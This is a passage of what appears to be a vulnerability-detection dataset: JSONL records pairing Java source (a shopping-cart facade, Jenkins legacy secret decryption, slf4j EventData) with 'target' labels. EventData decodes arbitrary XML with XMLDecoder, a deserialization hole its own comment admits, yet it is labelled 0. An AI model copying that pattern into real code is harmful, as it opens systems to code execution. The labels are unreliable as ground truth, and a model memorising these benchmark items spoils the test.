Exception {\n\t\tshoppingCartService.save(shoppingCart);\n\t}\n\t\n\tprivate String uniqueShoppingCartCode() {\n\t\treturn UUID.randomUUID().toString().replaceAll( \"-\", \"\" );\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart getById(Long shoppingCartId, MerchantStore store, Language language) throws Exception {\n\n\t\tShoppingCart cart = shoppingCartService.getById(shoppingCartId);\n\t\t\n\t\tReadableShoppingCart readableCart = null;\n\t\t\n\t\tif(cart != null) {\n\t\t\t\n\t        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n\t        \n\t        readableShoppingCart.setImageUtils(imageUtils);\n\t        readableShoppingCart.setPricingService(pricingService);\n\t        readableShoppingCart.setProductAttributeService(productAttributeService);\n\t        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n\n\t        readableShoppingCart.populate(cart, readableCart,  store, language);\n\t\t\t\n\t\t\t\n\t\t}\n\t\t\n\t\treturn readableCart;\n\t}\n\n\t@Override\n\tpublic ShoppingCart getShoppingCartModel(Long id, MerchantStore store) throws Exception {\n\t\treturn shoppingCartService.getById(id);\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart getByCode(String code, MerchantStore store, Language language) throws Exception {\n\t\t\n\t\tShoppingCart cart = shoppingCartService.getByCode(code, store);\n\t\t\n\t\tReadableShoppingCart readableCart = null;\n\t\t\n\t\tif(cart != null) {\n\t\t\t\n\t        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n\t        \n\t        readableShoppingCart.setImageUtils(imageUtils);\n\t        readableShoppingCart.setPricingService(pricingService);\n\t        readableShoppingCart.setProductAttributeService(productAttributeService);\n\t        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n\n\t        readableCart = readableShoppingCart.populate(cart, null,  store, language);\n\t\t\t\n\t\t\t\n\t\t}\n\t\t\n\t\treturn readableCart;\n\t\t\n\t}\n\n\n\n}\n", "target": 0}
{"idx": 1126, "func": "/*\n * The MIT License\n *\n * Copyright (c) 2004-2010, Sun Microsystems, Inc., Kohsuke Kawaguchi\n * Copyright (c) 2016, CloudBees Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson.util;\n\nimport com.trilead.ssh2.crypto.Base64;\nimport hudson.Util;\nimport jenkins.model.Jenkins;\nimport jenkins.security.CryptoConfidentialKey;\nimport org.kohsuke.accmod.Restricted;\nimport org.kohsuke.accmod.restrictions.NoExternalUse;\n\nimport javax.crypto.Cipher;\nimport javax.crypto.SecretKey;\nimport java.io.IOException;\nimport java.security.GeneralSecurityException;\n\nimport static java.nio.charset.StandardCharsets.UTF_8;\n\n/**\n * Historical algorithms for decrypting {@link Secret}s.\n */\n@Restricted(NoExternalUse.class)\npublic class HistoricalSecrets {\n\n    /*package*/ static Secret decrypt(String data, CryptoConfidentialKey key) throws IOException, GeneralSecurityException {\n        byte[] in = Base64.decode(data.toCharArray());\n        Secret s = tryDecrypt(key.decrypt(), in);\n        if (s!=null)    return s;\n\n        // try our historical key for backward compatibility\n        Cipher cipher = Secret.getCipher(\"AES\");\n        cipher.init(Cipher.DECRYPT_MODE, getLegacyKey());\n        return tryDecrypt(cipher, in);\n    }\n\n    /*package*/ static Secret tryDecrypt(Cipher cipher, byte[] in) {\n        try {\n            String plainText = new String(cipher.doFinal(in), UTF_8);\n            if(plainText.endsWith(MAGIC))\n                return new Secret(plainText.substring(0,plainText.length()-MAGIC.length()));\n            return null;\n        } catch (GeneralSecurityException e) {\n            return null; // if the key doesn't match with the bytes, it can result in BadPaddingException\n        }\n    }\n\n    /**\n     * Turns {@link Jenkins#getSecretKey()} into an AES key.\n     *\n     * @deprecated\n     * This is no longer the key we use to encrypt new information, but we still need this\n     * to be able to decrypt what's already persisted.\n     */\n    @Deprecated\n    /*package*/ static SecretKey getLegacyKey() throws GeneralSecurityException {\n        String secret = Secret.SECRET;\n        if(secret==null)    return Jenkins.getInstance().getSecretKeyAsAES128();\n        return Util.toAes128Key(secret);\n    }\n\n    private static final String MAGIC = \"::::MAGIC::::\";\n}\n", "target": 0}
{"idx": 1127, "func": "/**\n * Copyright (c) 2004-2011 QOS.ch\n * All rights reserved.\n *\n * Permission is hereby granted, free  of charge, to any person obtaining\n * a  copy  of this  software  and  associated  documentation files  (the\n * \"Software\"), to  deal in  the Software without  restriction, including\n * without limitation  the rights to  use, copy, modify,  merge, publish,\n * distribute,  sublicense, and/or sell  copies of  the Software,  and to\n * permit persons to whom the Software  is furnished to do so, subject to\n * the following conditions:\n *\n * The  above  copyright  notice  and  this permission  notice  shall  be\n * included in all copies or substantial portions of the Software.\n *\n * THE  SOFTWARE IS  PROVIDED  \"AS  IS\", WITHOUT  WARRANTY  OF ANY  KIND,\n * EXPRESS OR  IMPLIED, INCLUDING  BUT NOT LIMITED  TO THE  WARRANTIES OF\n * MERCHANTABILITY,    FITNESS    FOR    A   PARTICULAR    PURPOSE    AND\n * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE\n * LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\n * OF CONTRACT, TORT OR OTHERWISE,  ARISING FROM, OUT OF OR IN CONNECTION\n * WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n *\n */\npackage org.slf4j.ext;\n\nimport java.io.Serializable;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.Map;\nimport java.beans.XMLDecoder;\nimport java.beans.XMLEncoder;\nimport java.beans.ExceptionListener;\n\n/**\n * Base class for Event Data. Event Data contains data to be logged about an\n * event. Users may extend this class for each EventType they want to log.\n * \n * @author Ralph Goers\n * \n * @deprecated Due to a security vulnerability, this class will be removed without replacement.\n */\npublic class EventData implements Serializable {\n\n    private static final long serialVersionUID = 153270778642103985L;\n\n    private Map<String, Object> eventData = new HashMap<String, Object>();\n    public static final String EVENT_MESSAGE = \"EventMessage\";\n    public static final String EVENT_TYPE = \"EventType\";\n    public static final String EVENT_DATETIME = \"EventDateTime\";\n    public static final String EVENT_ID = \"EventId\";\n\n    /**\n     * Default Constructor\n     */\n    public EventData() {\n    }\n\n    /**\n     * Constructor to create event data from a Map.\n     * \n     * @param map\n     *          The event data.\n     */\n    public EventData(Map<String, Object> map) {\n        eventData.putAll(map);\n    }\n\n    /**\n     * Construct from a serialized form of the Map containing the RequestInfo\n     * elements\n     * \n     * @param xml\n     *          The serialized form of the RequestInfo Map.\n     */\n    @SuppressWarnings(\"unchecked\")\n    public EventData(String xml) {\n        ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());\n        try {\n            XMLDecoder decoder = new XMLDecoder(bais);\n            this.eventData = (Map<String, Object>) decoder.readObject();\n        } catch (Exception e) {\n            throw new EventException(\"Error decoding \" + xml, e);\n        }\n    }\n\n    /**\n     * Serialize all the EventData items into an XML representation.\n     * \n     * @return an XML String containing all the EventData items.\n     */\n    public String toXML() {\n        return toXML(eventData);\n    }\n\n    /**\n     * Serialize all the EventData items into an XML representation.\n     * \n     * @param map the Map to transform\n     * @return an XML String containing all the EventData items.\n     */\n    public static String toXML(Map<String, Object> map) {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            XMLEncoder encoder = new XMLEncoder(baos);\n            encoder.setExceptionListener(new ExceptionListener() {\n                public void exceptionThrown(Exception exception) {\n                    exception.printStackTrace();\n                }\n            });\n            encoder.writeObject(map);\n            encoder.close();\n            return baos.toString();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    /**\n     * Retrieve the event identifier.\n     * \n     * @return The event identifier\n     */\n    public String getEventId() {\n        return (String) this.eventData.get(EVENT_ID);\n    }\n\n    /**\n     * Set the event identifier.\n     * \n     * @param eventId\n     *          The event identifier.\n     */\n    public void setEventId(String eventId) {\n        if (eventId == null) {\n            throw new IllegalArgumentException(\"eventId cannot be null\");\n        }\n        this.eventData.put(EVENT_ID, eventId);\n    }\n\n    /**\n     * Retrieve the message text associated with this event, if any.\n     * \n     * @return The message text associated with this event or null if there is\n     *         none.\n     */\n    public String getMessage() {\n        return (String) this.eventData.get(EVENT_MESSAGE);\n    }\n\n    /**\n     * Set the message text associated with this event.\n     * \n     * @param message\n     *          The message text.\n     */\n    public void setMessage(String message) {\n        this.eventData.put(EVENT_MESSAGE, message);\n    }\n\n    /**\n     * Retrieve the date and time the event occurred.\n     * \n     * @return The Date associated with the event.\n     */\n    public Date getEventDateTime() {\n        return (Date) this.eventData.get(EVENT_DATETIME);\n    }\n\n    /**\n     * Set the date and time the event occurred in case it is not the same as when\n     * the event was logged.\n     * \n     * @param eventDateTime\n     *          The event Date.\n     */\n    public void setEventDateTime(Date eventDateTime) {\n        this.eventData.put(EVENT_DATETIME, eventDateTime);\n    }\n\n    /**\n     * Set the type of event that occurred.\n     * \n     * @param eventType\n     *          The type of the event.\n     */\n    public void setEventType(String eventType) {\n        this.eventData.put(EVENT_TYPE, eventType);\n    }\n\n    /**\n     * Retrieve the type of the event.\n     * \n     * @return The event type.\n     */\n    public String getEventType() {\n        return (String) this.eventData.get(EVENT_TYPE);\n    }\n\n    /**\n     * Add arbitrary attributes about the event.\n     * \n     * @param name\n     *          The attribute's key.\n     * @param obj\n     *          The data associated with the key.\n     */\n    public void put(String name, Serializable obj) {\n        this.eventData.put(name, obj);\n    }\n\n    /**\n     * Retrieve an event attribute.\n     * \n     * @param name\n     *          The attribute's key.\n     * @return The value associated with the key or null if the key is not\n     *         present.\n     */\n    public Serializable get(String name) {\n        return (Serializable) this.eventData.get(name);\n    }\n\n    /**\n     * Populate the event data from a Map.\n     * \n     * @param data\n     *          The Map to copy.\n     */\n    public void putAll(Map<String, Object> data) {\n        this.eventData.putAll(data);\n    }\n\n    /**\n     * Returns the number of attributes in the EventData.\n     * \n     * @return the number of attributes in the EventData.\n     */\n    public int getSize() {\n        return this.eventData.size();\n    }\n\n    /**\n     * Returns an Iterator over all the entries in the EventData.\n     * \n     * @return an Iterator that can be used to access all the event attributes.\n     */\n    public Iterator<Map.Entry<String, Object>> getEntrySetIterator() {\n        return this.eventData.entrySet().iterator();\n    }\n\n    /**\n     * Retrieve all the attributes in the EventData as a Map. Changes to this map\n     * will be reflected in the EventData.\n     * \n     * @return The Map of attributes in this EventData instance.\n     */\n    public Map<String, Object> getEventMap() {\n        return this.eventData;\n    }\n\n    /**\n     * Convert the EventData to a String.\n     * \n     * @return The EventData as a String.\n     */\n    @Override\n    public String toString() {\n        return toXML();\n    }\n\n    /**\n     * Compare two EventData objects for equality.\n     * \n     * @param o\n     *          The Object to compare.\n     * @return true if the objects are the same instance or contain all the same\n     *         keys and their values.\n     */\n    @SuppressWarnings(\"unchecked\")\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) {\n            return true;\n        }\n        if (!(o instanceof EventData || o instanceof Map)) {\n            return false;\n        }\n        Map<String, Object> map = (o instanceof EventData) ? ((EventData) o).getEventMap() : (Map<String, Object>) o;\n\n        return this.eventData.equals(map);\n    }\n\n    /**\n     * Compute the hashCode for this EventData instance.\n     * \n     * @return The hashcode for this EventData instance.\n     */\n    @Override\n    public int hashCode() {\n        return this.eventData.hashCode();\n    }\n}", "target": 0}
